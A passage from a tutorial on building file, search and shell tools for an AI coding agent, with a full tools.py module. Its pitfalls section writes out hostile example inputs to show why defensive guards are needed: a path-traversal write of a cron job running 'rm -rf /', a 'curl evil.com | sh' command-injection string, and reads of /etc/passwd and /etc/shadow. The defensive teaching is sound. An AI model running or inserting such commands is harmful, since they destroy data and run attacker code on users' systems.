GPT-4's. The model then either truncates its own reasoning to fit, or the API silently
drops early history items, causing the model to forget it had a plan.

### 7.2 The Truncation Contract

`_truncate` enforces two limits:
- **`max_chars = 40,000`** — roughly 10,000 tokens at 4 chars/token. Generous enough
  for almost all real tool results; tight enough to never blow the budget alone.
- **`max_lines = 2,000`** — a file with 2,000 lines is already large; the model should
  use offset/limit to page rather than reading everything.

Both limits emit a visible notice so the model knows output was cut:

```
[... output truncated at 2000 lines ...]
```

This is the correct behaviour. Silently truncating without a notice would cause the model
to believe it has the full output when it does not, producing hallucinated reasoning. The
notice tells it to ask for more if it needs it.

### 7.3 Foreshadowing Phase 6

Phase 6 covers context compaction: strategies for summarizing old tool results before
they crowd out current reasoning, sliding-window approaches, and the `max_output_tokens`
budget. `_truncate` is the per-call first line of defence; Phase 6 is the session-level
second line. Both are necessary.

---

## 8. Pitfalls and How to Avoid Them

> This section documents the most common failure modes when building agent tools. Each
> one has burned at least one production system.

### Path Traversal

**Symptom:** The model passes `path="../../../etc/passwd"` or an absolute path like
`/etc/shadow`. Without a guard, `write_file` happily overwrites it.

**Fix:** `_safe_path()` — every path tool call goes through it. The guard uses
`Path.resolve()` to follow symlinks and then checks that the result is relative to
`WORKSPACE_ROOT`. There is no edge case in which a relative path with `..` or a symlink
chain can escape.

**Test it:**

```python
# This should return an ERROR string, not write anything.
result = write_file("../../etc/cron.d/evil", "* * * * * rm -rf /")
assert result.startswith("ERROR:")
```

### Reading Huge Files

**Symptom:** The model calls `read_file("node_modules/big_lib/dist/bundle.js")` and
gets 80,000 lines of minified JavaScript, consuming the entire context window.

**Fix:** The `limit=2000` default and `_truncate` backstop. For intentionally large
files, `offset`/`limit` pagination is the right pattern. Teach the model (in the system
prompt or tool description) to read in windows rather than pulling entire files.

### Edit Ambiguity

**Symptom:** The model calls `edit_file` with `old_string="pass"` thinking there is one
such line. The file has 40 functions with `pass` as a body. The tool returns an ambiguity
error.

**Fix:** The uniqueness check in `edit_file`. The model must provide enough surrounding
context (e.g., the full function signature plus the body) to make `old_string` unique.
The error message says "found N occurrences" so the model knows exactly why it failed
and what to do.

### Command Injection

**Symptom:** User input is interpolated into a `bash` command:
`bash(f"grep {user_query} src/")`. User types `'; curl evil.com | sh; #'`.

**Fix:** Never interpolate unsanitised user input into shell commands. In a coding
agent, the model constructs commands — not the end user directly. The Phase 5 permission
layer adds a human-approval step for `bash` calls. If you need to pass user data to a
command, use `subprocess.run([...], shell=False)` with a properly escaped argument list,
or sanitise the input yourself.

### Blocking on Interactive Commands

**Symptom:** The model calls `bash("python3 -i")` trying to start a REPL. The process
waits for stdin forever. The timeout fires after 120 seconds.

**Fix:** `stdin=subprocess.DEVNULL` ensures the process sees EOF immediately if it
tries to read. The docstring warns the model explicitly: "Interactive commands will
hang. Use non-interactive invocations." Also, 120 seconds is generous — for quick
operations lower the timeout to 30 seconds.

### Encoding Errors

**Symptom:** A source file contains a Latin-1 byte sequence (e.g., a comment with an
accented character in an old codebase). `p.read_text(encoding="utf-8")` raises
`UnicodeDecodeError`. The tool crashes — or would, if we did not handle it.

**Fix:** Every read in this module uses `errors='replace'`. This substitutes the
Unicode replacement character (U+FFFD) for undecodable bytes. The model sees the file
with `?`-like markers instead of a hard error. For truly binary files the null-byte
heuristic fires first. This is the correct approach: never crash on encoding issues in
a tool; always return something the model can reason about.

---

## 9. Complete `tools.py`

For reference, here is the full module with all pieces assembled in dependency order:

```python
# tools.py  — Phase 4: Real-world coding-agent tools
from __future__ import annotations

import fnmatch
import json
import os
import pathlib
import re
import subprocess
from typing import Optional

from registry import tool, Registry

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

WORKSPACE_ROOT: pathlib.Path = pathlib.Path(os.getcwd()).resolve()

_DEFAULT_MAX_CHARS = 40_000
_DEFAULT_MAX_LINES = 2_000

# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

def _safe_path(user_path: str) -> pathlib.Path:
    p = pathlib.Path(user_path)
    if p.is_absolute():
        rel = pathlib.Path(*p.parts[1:])
        p = WORKSPACE_ROOT / rel
    else:
        p = WORKSPACE_ROOT / p
    resolved = p.resolve()
    try:
        resolved.relative_to(WORKSPACE_ROOT)
    except ValueError:
        raise ValueError(
            f"Path '{user_path}' resolves to '{resolved}' which is outside "
            f"the workspace root '{WORKSPACE_ROOT}'."
        )
    return resolved


def _truncate(
    text: str,
    max_chars: int = _DEFAULT_MAX_CHARS,
    max_lines: int = _DEFAULT_MAX_LINES,
    label: str = "output",
) -> str:
    lines = text.splitlines(keepends=True)
    if len(lines) > max_lines:
        lines = lines[:max_lines]
        text = "".join(lines)
        text += f"\n[... {label} truncated at {max_lines} lines ...]"
    if len(text) > max_chars:
        text = text[:max_chars]
        text += f"\n[... {label} truncated at {max_chars} chars ...]"
    return text


def _human_size(n: int) -> str:
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.0f} {unit}"
        n /= 1024
    return f"{n:.1f} TB"

# ---------------------------------------------------------------------------
# Tools
# ---------------------------------------------------------------------------

@tool
def read_file(path: str, offset: int = 0, limit: int = 2000) -> str:
    """
    Read a text file and return its contents with line numbers.

    Args:
        path:   Path to the file, relative to the workspace root.
        offset: First line to return (0-indexed).  Default 0 (start of file).
        limit:  Maximum number of lines to return.  Default 2000.

    Returns:
        File contents formatted as 'lineN\\tcontent'.  ERROR string on failure.
    """
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    if not p.exists():
        return f"ERROR: File not found: {path}"
    if not p.is_file():
        return f"ERROR: Not a regular file: {path}"
    try:
        raw = p.read_bytes()
    except OSError as exc:
        return f"ERROR: Cannot read file: {exc}"
    if b"\x00" in raw[:8192]:
        return f"ERROR: '{path}' appears to be binary ({len(raw)} bytes)."
    text = raw.decode("utf-8", errors="replace")
    lines = text.splitlines()
    total = len(lines)
    sliced = lines[offset : offset + limit]
    if not sliced:
        return f"File '{path}' has {total} lines; offset={offset} is past end."
    w = len(str(offset + len(sliced)))
    numbered = "\n".join(
        f"{offset + i + 1:{w}d}\t{line}" for i, line in enumerate(sliced)
    )
    header = f"File: {path}  (lines {offset+1}–{offset+len(sliced)} of {total})\n"
    return _truncate(header + numbered, label=f"read_file({path})")


@tool
def write_file(path: str, content: str) -> str:
    """
    Write content to a file, creating it (and parent dirs) if needed.

    Args:
        path:    Path to the file, relative to the workspace root.
        content: Full UTF-8 text content to write.

    Returns:
        Confirmation string, or ERROR.  WARNING: destructive — overwrites existing files.
    """
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    try:
        p.parent.mkdir(parents=True, exist_ok=True)
        encoded = content.encode("utf-8")
        p.write_bytes(encoded)
    except OSError as exc:
        return f"ERROR: Cannot write file: {exc}"
    return f"Wrote {len(encoded)} bytes ({content.count(chr(10))} lines) to '{path}'."


@tool
def edit_file(path: str, old_string: str, new_string: str, replace_all: bool = False) -> str:
    """
    Replace an exact string in a file with a new string.

    Args:
        path:        File path relative to workspace root.
        old_string:  Exact text to find.  Must be unique unless replace_all=True.
        new_string:  Replacement text.
        replace_all: Replace all occurrences if True.  Default False.

    Returns:
        Confirmation, or ERROR if old_string is not found or is ambiguous.
    """
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    if not p.exists():
        return f"ERROR: File not found: {path}"
    if not p.is_file():
        return f"ERROR: Not a regular file: {path}"
    try:
        original = p.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        return f"ERROR: Cannot read file: {exc}"
    count = original.count(old_string)
    if count == 0:
        snippet = repr(old_string[:120]) + ("..." if len(old_string) > 120 else "")
        return (
            f"ERROR: old_string not found in '{path}'.\n"
            f"Searched for: {snippet}\n"
            "Check whitespace and indentation exactly match the file."
        )
    if count > 1 and not replace_all:
        return (
            f"ERROR: old_string is ambiguous — found {count} occurrences in '{path}'. "
            "Provide more context to make it unique, or pass replace_all=True."
        )
    updated = original.replace(old_string, new_string)
    try:
        p.write_text(updated, encoding="utf-8")
    except OSError as exc:
        return f"ERROR: Cannot write file: {exc}"
    reps = count if replace_all else 1
    delta = updated.count("\n") - original.count("\n")
    return (
        f"Edited '{path}': replaced {reps} occurrence(s). "
        f"File now has {updated.count(chr(10)) + 1} lines "
        f"({'+' if delta >= 0 else ''}{delta} from before)."
    )


@tool
def bash(command: str, timeout: int = 120) -> str:
    """
    Run a shell command and return its combined stdout+stderr output.

    Args:
        command: Shell command to run under /bin/sh.  Pipes, redirects, and
                 shell features work.  stdin is closed so interactive commands
                 will fail immediately rather than hanging.
        timeout: Seconds before the command is killed.  Default 120.

    Returns:
        'Exit code: N\\n---\\n<output>' or ERROR on timeout/failure.

    WARNING: Executes arbitrary code.  Do not pass unsanitised user input.
    """
    try:
        result = subprocess.run(
            command,
            shell=True,
            cwd=str(WORKSPACE_ROOT),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=timeout,
        )
        output = result.stdout.decode("utf-8", errors="replace")
        output = _truncate(output, label=f"bash({command[:60]})")
        return f"Exit code: {result.returncode}\n---\n{output}"
    except subprocess.TimeoutExpired:
        return f"ERROR: Command timed out after {timeout} seconds: {command}"
    except OSError as exc:
        return f"ERROR: Failed to start command: {exc}"


@tool
def glob(pattern: str, path: str = ".") -> str:
    """
    Find files matching a glob pattern.

    Args:
        pattern: Glob pattern, e.g. '**/*.py', '*.md'.  '**' is recursive.
        path:    Directory to search, relative to workspace root.  Default '.'.

    Returns:
        Sorted, newline-separated list of matching file paths (relative to
        workspace root).  Capped at 500 results.
    """
    _MAX = 500
    try:
        base = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    if not base.exists():
        return f"ERROR: Directory not found: {path}"
    if not base.is_dir():
        return f"ERROR: Not a directory: {path}"
    try:
        if "**" in pattern:
            matches = list(base.rglob(pattern.lstrip("**/").lstrip("/")))
        else:
            matches = list(base.glob(pattern))
    except (OSError, ValueError) as exc:
        return f"ERROR: Glob failed: {exc}"
    files = sorted([m for m in matches if m.is_file()], key=str)
    truncated = len(files) > _MAX
    files = files[:_MAX]
    if not files:
        return f"No files match '{pattern}' under '{path}'."
    rel = []
    for f in files:
        try:
            rel.append(str(f.relative_to(WORKSPACE_ROOT)))
        except ValueError:
            rel.append(str(f))
    result = "\n".join(rel)
    if truncated:
        result += f"\n[... capped at {_MAX} results ...]"
    return result


@tool
def grep(pattern: str, path: str = ".", glob_filter: str = None) -> str:
    """
    Search file contents for a regular expression.

    Args:
        pattern:     Python regex pattern.  Case-sensitive.  Use (?i) prefix
                     for case-insensitive search.
        path:        File or directory to search, relative to workspace root.
                     Directories are searched recursively.  Default '.'.
        glob_filter: If given, only files whose name matches this glob are
                     searched, e.g. '*.py'.

    Returns:
        Matching lines as 'filepath:linenum: content'.  Capped at 200 matches.
    """
    _MAX = 200
    _MAX_FILE = 5 * 1024 * 1024
    try:
        compiled = re.compile(pattern)
    except re.error as exc:
        return f"ERROR: Invalid regex: {exc}"
    try:
        base = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    if not base.exists():
        return f"ERROR: Path not found: {path}"
    files = [base] if base.is_file() else sorted(
        [f for f in base.rglob("*") if f.is_file()], key=str
    )
    if glob_filter:
        files = [f for f in files if fnmatch.fnmatch(f.name, glob_filter)]
    results, skipped_bin, skipped_large = [], 0, 0
    for filepath in files:
        if len(results) >= _MAX:
            break
        try:
            size = filepath.stat().st_size
        except OSError:
            continue
        if size > _MAX_FILE:
            skipped_large += 1
            continue
        try:
            raw = filepath.read_bytes()
        except OSError:
            continue
        if b"\x00" in raw[:8192]:
            skipped_bin += 1
            continue
        text = raw.decode("utf-8", errors="replace")
        for lineno, line in enumerate(text.splitlines(), 1):
            if len(results) >= _MAX:
                break
            if compiled.search(line):
                try:
                    rel = str(filepath.relative_to(WORKSPACE_ROOT))
                except ValueError:
                    rel = str(filepath)
                display = line[:300] + ("..." if len(line) > 300 else "")
                results.append(f"{rel}:{lineno}: {display}")
    if not results:
        return f"No matches for '{pattern}' under '{path}'."
    output = "\n".join(results)
    notes = []
    if len(results) >= _MAX:
        notes.append(f"capped at {_MAX} results")
    if skipped_bin:
        notes.append(f"{skipped_bin} binary file(s) skipped")
    if skipped_large:
        notes.append(f"{skipped_large} large file(s) skipped")
    if notes:
        output += "\n[" + "; ".join(notes) + "]"
    return output


@tool
def list_dir(path: str = ".") -> str:
    """
    List the contents of a directory.

    Args:
        path: Directory path relative to workspace root.  Default '.'.

    Returns:
        One entry per line: 'D  name/' for directories, 'F  name  size' for
        files.  Directories listed before files, both alphabetically sorted.
    """
    _MAX = 300
    try:
        p = _safe_path(path)
    except ValueError as exc:
        return f"ERROR: {exc}"
    if not p.exists():
        return f"ERROR: Not found: {path}"
    if p.is_file():
        return f"ERROR: '{path}' is a file; use read_file() to read it."
    try:
        entries = list(p.iterdir())
    except OSError as exc:
        return f"ERROR: {exc}"
    dirs = sorted([e for e in entries if e.is_dir()], key=lambda e: e.name.lower())
    files = sorted([e for e in entries if e.is_file()], key=lambda e: e.name.lower())
    ordered = (dirs + files)[:_MAX]
    lines = []
    for e in ordered:
        if e.is_dir():
            lines.append(f"D  {e.name}/")
        else:
            try:
                size = _human_size(e.stat().st_size)
            except OSError:
                size = "?"
            lines.append(f"F  {e.name:<40s}  {size:>8s}")
    header = f"Directory: {path}  ({len(dirs)} dirs, {len(files)} files)\n"
    result = header + "\n".join(lines)
    if len(dirs) + len(files) > _MAX:
        result += f"\n[... capped at {_MAX} entries ...]"
    return result

# ---------------------------------------------------------------------------
# Factory
# ---------------------------------------------------------------------------

def make_default_registry(workspace: pathlib.Path = None) -> Registry:
    """
    Return a Registry pre-loaded with all coding-agent tools.

    Args:
        workspace: Override WORKSPACE_ROOT.  Defaults to cwd at import time.
    """
    global WORKSPACE_ROOT
    if workspace is not None:
        WORKSPACE_ROOT = workspace.resolve()
    registry = Registry()
    for fn in (read_file, write_file, edit_file, bash, glob, grep, list_dir):
        registry.register(fn)
    return registry
```

---

## 10. What Comes Next

This phase gave the agent hands: it can now read any file in its workspace, make
surgical edits, run shell commands, and search the codebase efficiently. But with great
power comes great risk — `bash` is an unrestricted code-execution interface and
`write_file` is irreversible.

**Phase 5 — Permissions and the Human-in-the-Loop** introduces a permission layer that
sits between the agent loop and tool dispatch. Every call to a "dangerous" tool (bash,
write_file, edit_file) surfaces a human-readable preview and waits for explicit user
approval before executing. The agent harness stays unchanged; the permission system is
a thin wrapper around `registry.dispatch`.

**Phase 6 — Context Management** addresses what happens when a long agentic session
fills the context window: how to summarize stale tool results, implement a sliding
window over the transcript, and use `max_output_tokens` budgeting to keep the model
reasoning clearly across hundreds of tool calls.

---

## Key takeaways

- **Tools define the agent's power.** `read_file`, `edit_file`, `bash`, `grep`, and
  `glob` are what turn the bare loop into a coding agent.
- Every tool shares the same **discipline**: keep paths inside the workspace, return
  **error strings** instead of raising, and practice **output-size discipline** —
  truncate/paginate so one big result can't swamp the context window.
- **`make_default_registry()`** wires the whole toolset together in one place, so the
  loop just dispatches by name.
- The genuinely **risky** tools (writing files, running shell) are exactly where
  Phase 5's permission layer plugs in — the harness itself stays unchanged.

## Check yourself

1. Name three tools that turn the loop into a coding agent.
2. Why is truncating/paginating tool output a correctness concern, not just cosmetics?
3. What should a tool do when it's handed a missing file or a path outside the workspace?
4. Where is the full toolset assembled for the agent to use?

<details><summary>Answers</summary>

1. Any three of `read_file`, `edit_file`, `bash`, `grep`, `glob`.
2. Oversized output **crowds out conversation history** in the context window, degrading
   the model's reasoning — so bounded output keeps long sessions coherent.
3. Return a **clear error string** (not raise) and refuse paths that escape the
   workspace root — so the model can see the problem and the harness stays safe.
4. In **`make_default_registry()`**.
</details>
